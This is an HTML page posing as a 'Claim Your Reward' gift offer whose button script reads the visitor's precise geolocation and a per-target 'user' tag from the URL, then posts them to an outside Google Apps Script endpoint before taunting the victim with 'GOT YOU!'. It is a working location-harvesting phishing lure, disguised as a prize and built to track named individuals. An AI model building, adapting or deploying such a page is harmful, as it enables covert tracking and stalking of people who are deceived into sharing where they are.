<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GIFT</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
      background: #f4f4f4;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    #status {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h2>Claim Your Reward</h2>
  <p>Congratulations!</p>
  <button onclick="sendLocation()">Claim Gift!</button>
  <p id="status">Click the button above to start.</p>

  <script>
    function getQueryParam(param) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(param) || "anonymous";
    }

    function sendLocation() {
      if (navigator.geolocation) {
        document.getElementById("status").innerText = "Loading...";

        navigator.geolocation.getCurrentPosition(position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const acc = position.coords.accuracy;
          const user = getQueryParam("user");

          fetch("https://script.google.com/macros/s/AKfycbwCi77o6VcYIK3kdsGHx23npHOx5piHgvW1-Z1ojzmLAjlEec0aFIlZOj_90F2QW-XGbQ/exec", {
            method: "POST",
            body: JSON.stringify({ lat, lon, acc, user }),
            headers: {
              "Content-Type": "application/json"
            }
          })
          .then(response => response.text())
          .then(data => {
            document.getElementById("status").innerText = "Fool üòé Bingo GOT YOU!";
          })
          .catch(error => {
            console.error(error);
            document.getElementById("status").innerText = "‚ùå Error Check Your Mobile Network";
          });

        }, () => {
          document.getElementById("status").innerText = "‚ùå Permission denied or failed.";
        });
      } else {
        document.getElementById("status").innerText = "‚ùå Geolocation not supported.";
      }
    }
  </script>
</body>
</html>
